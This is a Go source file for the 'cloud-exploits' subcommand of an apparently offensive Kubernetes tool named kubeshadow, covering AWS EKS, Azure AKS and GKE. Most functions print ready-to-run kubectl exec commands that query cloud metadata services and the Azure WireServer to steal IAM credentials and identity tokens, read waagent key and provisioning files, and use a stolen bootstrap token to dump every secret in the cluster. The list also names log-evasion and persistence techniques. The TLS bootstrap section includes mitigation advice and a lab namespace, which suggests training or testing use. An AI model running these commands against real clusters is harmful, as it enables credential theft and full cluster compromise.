package exploitation

import (
	"fmt"

	"github.com/spf13/cobra"
)

// CloudExploitsCmd represents the cloud-specific exploits command
var CloudExploitsCmd = &cobra.Command{
	Use:   "cloud-exploits",
	Short: "Cloud-specific exploitation techniques",
	Long: `Cloud-Specific Exploitation Framework

Cloud platform-specific exploitation techniques:
- AWS EKS: IAM roles, metadata service, S3 access
- Azure AKS: Managed Identity, Key Vault, Storage Account, TLS Bootstrap Attack
- Google GKE: Workload Identity, Secret Manager, Cloud Storage
- Multi-cloud: Cross-platform attacks and persistence

Examples:
  kubeshadow exploitation cloud-exploits list
  kubeshadow exploitation cloud-exploits aws-iam-escalate --target-role arn:aws:iam::123456789012:role/eks-node-group
  kubeshadow exploitation cloud-exploits azure-identity-theft --target-identity my-identity
  kubeshadow exploitation cloud-exploits azure-tls-bootstrap --target vulnerable-pod --namespace tls-bootstrap-lab
  kubeshadow exploitation cloud-exploits gcp-workload-identity --target-service-account my-sa@project.iam.gserviceaccount.com`,
	RunE: runCloudExploits,
}

func runCloudExploits(cmd *cobra.Command, args []string) error {
	action, _ := cmd.Flags().GetString("action")

	switch action {
	case "list":
		return listCloudExploits()
	case "execute":
		return executeCloudExploit(cmd)
	case "detect":
		return detectCloudPlatform(cmd)
	default:
		return listCloudExploits()
	}
}

func listCloudExploits() error {
	fmt.Println("üéØ Available Cloud-Specific Exploits")
	fmt.Println("====================================")
	fmt.Println("")

	fmt.Println("‚òÅÔ∏è  AWS EKS Exploits:")
	fmt.Println("  aws-iam-escalate     - Escalate via IAM roles and policies")
	fmt.Println("  aws-metadata-hijack  - Hijack EC2 metadata service")
	fmt.Println("  aws-s3-access        - Access S3 buckets via pod permissions")
	fmt.Println("  aws-secrets-manager  - Access AWS Secrets Manager")
	fmt.Println("  aws-ssm-access       - Access Systems Manager Parameter Store")
	fmt.Println("  aws-cloudtrail-evade - Evade CloudTrail logging")
	fmt.Println("")

	fmt.Println("üîµ Azure AKS Exploits:")
	fmt.Println("  azure-identity-theft - Steal Managed Identity tokens")
	fmt.Println("  azure-keyvault-access - Access Azure Key Vault")
	fmt.Println("  azure-storage-access  - Access Azure Storage Account")
	fmt.Println("  azure-metadata-hijack - Hijack Azure metadata service")
	fmt.Println("  azure-rbac-escalate  - Escalate via Azure RBAC")
	fmt.Println("  azure-monitor-evade  - Evade Azure Monitor logging")
	fmt.Println("  azure-tls-bootstrap  - TLS Bootstrap Attack to read all secrets")
	fmt.Println("")

	fmt.Println("üü¢ Google GKE Exploits:")
	fmt.Println("  gcp-workload-identity - Abuse Workload Identity")
	fmt.Println("  gcp-secret-manager    - Access Secret Manager")
	fmt.Println("  gcp-cloud-storage     - Access Cloud Storage buckets")
	fmt.Println("  gcp-metadata-hijack   - Hijack GCP metadata service")
	fmt.Println("  gcp-iam-escalate      - Escalate via IAM permissions")
	fmt.Println("  gcp-audit-log-evade   - Evade Cloud Audit Logs")
	fmt.Println("")

	fmt.Println("üåê Multi-Cloud Exploits:")
	fmt.Println("  cross-cloud-pivot     - Pivot between cloud platforms")
	fmt.Println("  cloud-credential-hunt - Hunt for cloud credentials")
	fmt.Println("  multi-cloud-persistence - Establish cross-platform persistence")
	fmt.Println("  cloud-network-pivot   - Pivot through cloud networks")

	return nil
}

func executeCloudExploit(cmd *cobra.Command) error {
	exploit, _ := cmd.Flags().GetString("exploit")
	target, _ := cmd.Flags().GetString("target")
	namespace, _ := cmd.Flags().GetString("namespace")
	cloud, _ := cmd.Flags().GetString("cloud")

	fmt.Printf("üéØ Executing cloud exploit: %s on %s\n", exploit, cloud)
	fmt.Println("=====================================")

	switch exploit {
	case "aws-iam-escalate":
		return executeAWSIAMEscalate(target, namespace)
	case "aws-metadata-hijack":
		return executeAWSMetadataHijack(target, namespace)
	case "aws-s3-access":
		return executeAWSS3Access(target, namespace)
	case "azure-identity-theft":
		return executeAzureIdentityTheft(target, namespace)
	case "azure-keyvault-access":
		return executeAzureKeyVaultAccess(target, namespace)
	case "azure-tls-bootstrap":
		return executeAzureTLSBootstrap(target, namespace)
	case "gcp-workload-identity":
		return executeGCPWorkloadIdentity(target, namespace)
	case "gcp-secret-manager":
		return executeGCPSecretManager(target, namespace)
	case "cross-cloud-pivot":
		return executeCrossCloudPivot(target, namespace)
	default:
		return fmt.Errorf("unknown cloud exploit: %s", exploit)
	}
}

func executeAWSIAMEscalate(target, namespace string) error {
	fmt.Printf("‚òÅÔ∏è  Executing AWS IAM escalation for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("üìã AWS IAM Escalation Steps:")
	fmt.Println("1. Enumerating IAM roles attached to pods...")
	fmt.Println("2. Checking IAM policy permissions...")
	fmt.Println("3. Attempting to assume higher-privilege roles...")
	fmt.Println("4. Testing AWS API access...")

	fmt.Println("\nüí° Commands to execute:")
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/%s\n", namespace, target, target)
	fmt.Printf("kubectl exec -n %s %s -- aws sts get-caller-identity\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- aws iam list-attached-role-policies --role-name %s\n", namespace, target, target)

	fmt.Println("\n‚úÖ AWS IAM escalation exploit prepared!")
	return nil
}

func executeAWSMetadataHijack(target, namespace string) error {
	fmt.Printf("‚òÅÔ∏è  Executing AWS metadata hijack for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("üìã AWS Metadata Hijack Steps:")
	fmt.Println("1. Accessing EC2 metadata service...")
	fmt.Println("2. Extracting IAM credentials...")
	fmt.Println("3. Testing AWS API access...")
	fmt.Println("4. Attempting privilege escalation...")

	fmt.Println("\nüí° Commands to execute:")
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://169.254.169.254/latest/meta-data/\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/%s\n", namespace, target, target)
	fmt.Printf("kubectl exec -n %s %s -- aws sts get-caller-identity\n", namespace, target)

	fmt.Println("\n‚úÖ AWS metadata hijack exploit prepared!")
	return nil
}

func executeAWSS3Access(target, namespace string) error {
	fmt.Printf("‚òÅÔ∏è  Executing AWS S3 access for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("üìã AWS S3 Access Steps:")
	fmt.Println("1. Testing S3 permissions...")
	fmt.Println("2. Enumerating accessible buckets...")
	fmt.Println("3. Attempting to read/write objects...")
	fmt.Println("4. Searching for sensitive data...")

	fmt.Println("\nüí° Commands to execute:")
	fmt.Printf("kubectl exec -n %s %s -- aws s3 ls\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- aws s3api list-buckets\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- aws s3 ls s3://sensitive-bucket/\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- aws s3 cp s3://sensitive-bucket/secret.txt /tmp/secret.txt\n", namespace, target)

	fmt.Println("\n‚úÖ AWS S3 access exploit prepared!")
	return nil
}

func executeAzureIdentityTheft(target, namespace string) error {
	fmt.Printf("üîµ Executing Azure identity theft for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("üìã Azure Identity Theft Steps:")
	fmt.Println("1. Accessing Azure metadata service...")
	fmt.Println("2. Extracting Managed Identity tokens...")
	fmt.Println("3. Testing Azure API access...")
	fmt.Println("4. Attempting privilege escalation...")

	fmt.Println("\nüí° Commands to execute:")
	fmt.Printf("kubectl exec -n %s %s -- curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- curl -s 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- az account show\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- az role assignment list --assignee %s\n", namespace, target, target)

	fmt.Println("\n‚úÖ Azure identity theft exploit prepared!")
	return nil
}

func executeAzureKeyVaultAccess(target, namespace string) error {
	fmt.Printf("üîµ Executing Azure Key Vault access for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("üìã Azure Key Vault Access Steps:")
	fmt.Println("1. Testing Key Vault permissions...")
	fmt.Println("2. Enumerating accessible vaults...")
	fmt.Println("3. Attempting to read secrets...")
	fmt.Println("4. Searching for sensitive data...")

	fmt.Println("\nüí° Commands to execute:")
	fmt.Printf("kubectl exec -n %s %s -- az keyvault list\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- az keyvault secret list --vault-name my-vault\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- az keyvault secret show --vault-name my-vault --name my-secret\n", namespace, target)

	fmt.Println("\n‚úÖ Azure Key Vault access exploit prepared!")
	return nil
}

func executeAzureTLSBootstrap(target, namespace string) error {
	fmt.Printf("üîµ Executing Azure TLS Bootstrap Attack for %s in %s\n", target, namespace)
	fmt.Println("=============================================")
	fmt.Println("")
	fmt.Println("‚ö†Ô∏è  TLS Bootstrap Attack on Azure Kubernetes Clusters")
	fmt.Println("An attacker with command execution in a pod can:")
	fmt.Println("  1. Download the configuration used to provision the cluster node")
	fmt.Println("  2. Extract the TLS bootstrap tokens")
	fmt.Println("  3. Perform a TLS bootstrap attack to read all secrets within the cluster")
	fmt.Println("")
	fmt.Println("üìã TLS Bootstrap Attack Steps:")
	fmt.Println("1. Accessing Azure WireServer (168.63.129.16)...")
	fmt.Println("2. Downloading node provisioning configuration...")
	fmt.Println("3. Extracting wireserver.key...")
	fmt.Println("4. Decrypting provisioning script to get TLS bootstrap tokens...")
	fmt.Println("5. Using bootstrap token to authenticate to Kubernetes API...")
	fmt.Println("6. Reading all secrets in the cluster...")
	fmt.Println("")
	fmt.Println("üí° Commands to execute:")
	fmt.Println("")
	fmt.Println("# Step 1: Access Azure WireServer (requires host network)")
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://168.63.129.16/go/Provisioning/GetProvisioningScript\n", namespace, target)
	fmt.Println("")
	fmt.Println("# Step 2: Access wireserver key (if mounted)")
	fmt.Printf("kubectl exec -n %s %s -- cat /var/lib/waagent/wireserver.key 2>/dev/null || echo 'Key not found in pod'\n", namespace, target)
	fmt.Println("")
	fmt.Println("# Step 3: Access provisioning script/CustomData")
	fmt.Printf("kubectl exec -n %s %s -- cat /var/lib/waagent/CustomData 2>/dev/null || echo 'CustomData not found'\n", namespace, target)
	fmt.Println("")
	fmt.Println("# Step 4: Extract TLS bootstrap token from provisioning script")
	fmt.Printf("kubectl exec -n %s %s -- grep -i 'bootstrap\\|token\\|kubeconfig' /var/lib/waagent/CustomData 2>/dev/null || echo 'No tokens found'\n", namespace, target)
	fmt.Println("")
	fmt.Println("# Step 5: Use bootstrap token to access Kubernetes API")
	fmt.Println("# (Replace <BOOTSTRAP_TOKEN> with extracted token)")
	fmt.Printf("kubectl --token=<BOOTSTRAP_TOKEN> --server=https://kubernetes.default.svc.cluster.local:443 --insecure-skip-tls-verify get secrets --all-namespaces\n")
	fmt.Println("")
	fmt.Println("# Step 6: Read secrets from all namespaces")
	fmt.Printf("kubectl --token=<BOOTSTRAP_TOKEN> --server=https://kubernetes.default.svc.cluster.local:443 --insecure-skip-tls-verify get secrets -n default\n")
	fmt.Printf("kubectl --token=<BOOTSTRAP_TOKEN> --server=https://kubernetes.default.svc.cluster.local:443 --insecure-skip-tls-verify get secrets -n kube-system\n")
	fmt.Println("")
	fmt.Println("# Step 7: Extract specific secret values")
	fmt.Printf("kubectl --token=<BOOTSTRAP_TOKEN> --server=https://kubernetes.default.svc.cluster.local:443 --insecure-skip-tls-verify get secret <secret-name> -n <namespace> -o yaml\n")
	fmt.Println("")
	fmt.Println("üîç Lab Environment Commands:")
	fmt.Println("# If using the lab environment (tls-bootstrap-lab namespace):")
	fmt.Printf("kubectl get pods -n tls-bootstrap-lab\n")
	fmt.Printf("kubectl exec -n tls-bootstrap-lab <pod-name> -- sh\n")
	fmt.Println("# Then from within the pod:")
	fmt.Println("curl http://168.63.129.16/go/Provisioning/GetProvisioningScript")
	fmt.Println("cat /var/lib/waagent/CustomData | grep -i bootstrap")
	fmt.Println("")
	fmt.Println("üìö Attack Impact:")
	fmt.Println("  - Read all secrets in the cluster")
	fmt.Println("  - Access sensitive configuration data")
	fmt.Println("  - Potential for further privilege escalation")
	fmt.Println("  - Complete cluster compromise")
	fmt.Println("")
	fmt.Println("üõ°Ô∏è  Mitigation:")
	fmt.Println("  - Restrict host network access for pods")
	fmt.Println("  - Implement network policies to block access to Azure WireServer (168.63.129.16)")
	fmt.Println("  - Use pod security policies/admission controllers to prevent privileged containers")
	fmt.Println("  - Regularly rotate TLS bootstrap tokens")
	fmt.Println("  - Monitor for unauthorized access to provisioning data")
	fmt.Println("  - Implement least privilege access controls")
	fmt.Println("  - Use Azure Private Clusters to limit exposure")
	fmt.Println("")
	fmt.Println("‚úÖ Azure TLS Bootstrap attack exploit prepared!")
	fmt.Println("‚ö†Ô∏è  WARNING: This attack can read ALL secrets in the cluster!")
	return nil
}

func executeGCPWorkloadIdentity(target, namespace string) error {
	fmt.Printf("üü¢ Executing GCP Workload Identity abuse for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("üìã GCP Workload Identity Steps:")
	fmt.Println("1. Accessing GCP metadata service...")
	fmt.Println("2. Extracting service account tokens...")
	fmt.Println("3. Testing GCP API access...")
	fmt.Println("4. Attempting privilege escalation...")

	fmt.Println("\nüí° Commands to execute:")
	fmt.Printf("kubectl exec -n %s %s -- curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity' -H 'Metadata-Flavor: Google'\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- gcloud auth list\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- gcloud projects list\n", namespace, target)

	fmt.Println("\n‚úÖ GCP Workload Identity exploit prepared!")
	return nil
}

func executeGCPSecretManager(target, namespace string) error {
	fmt.Printf("üü¢ Executing GCP Secret Manager access for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("üìã GCP Secret Manager Steps:")
	fmt.Println("1. Testing Secret Manager permissions...")
	fmt.Println("2. Enumerating accessible secrets...")
	fmt.Println("3. Attempting to read secret values...")
	fmt.Println("4. Searching for sensitive data...")

	fmt.Println("\nüí° Commands to execute:")
	fmt.Printf("kubectl exec -n %s %s -- gcloud secrets list\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- gcloud secrets versions list my-secret\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- gcloud secrets versions access latest --secret=my-secret\n", namespace, target)

	fmt.Println("\n‚úÖ GCP Secret Manager exploit prepared!")
	return nil
}

func executeCrossCloudPivot(target, namespace string) error {
	fmt.Printf("üåê Executing cross-cloud pivot for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("üìã Cross-Cloud Pivot Steps:")
	fmt.Println("1. Detecting cloud platform...")
	fmt.Println("2. Enumerating cloud credentials...")
	fmt.Println("3. Testing cross-platform access...")
	fmt.Println("4. Establishing multi-cloud persistence...")

	fmt.Println("\nüí° Commands to execute:")
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo 'AWS detected'\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null && echo 'Azure detected'\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null && echo 'GCP detected'\n", namespace, target)

	fmt.Println("\n‚úÖ Cross-cloud pivot exploit prepared!")
	return nil
}

func detectCloudPlatform(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	target, _ := cmd.Flags().GetString("target")

	fmt.Printf("üîç Detecting cloud platform for %s in %s\n", target, namespace)
	fmt.Println("=============================================")

	fmt.Println("üìã Cloud Platform Detection Steps:")
	fmt.Println("1. Testing AWS metadata service...")
	fmt.Println("2. Testing Azure metadata service...")
	fmt.Println("3. Testing GCP metadata service...")
	fmt.Println("4. Analyzing cloud-specific resources...")

	fmt.Println("\nüí° Commands to execute:")
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo 'AWS EKS detected'\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null && echo 'Azure AKS detected'\n", namespace, target)
	fmt.Printf("kubectl exec -n %s %s -- curl -s http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null && echo 'Google GKE detected'\n", namespace, target)
	fmt.Printf("kubectl get nodes -o wide | grep -E '(eks|aks|gke)'\n")

	fmt.Println("\n‚úÖ Cloud platform detection completed!")
	return nil
}

func init() {
	CloudExploitsCmd.Flags().String("action", "list", "Action to perform (list, execute, detect)")
	CloudExploitsCmd.Flags().String("exploit", "", "Cloud exploit to execute")
	CloudExploitsCmd.Flags().String("target", "", "Target for cloud exploitation")
	CloudExploitsCmd.Flags().String("namespace", "default", "Target namespace")
	CloudExploitsCmd.Flags().String("cloud", "", "Cloud platform (aws, azure, gcp)")
}
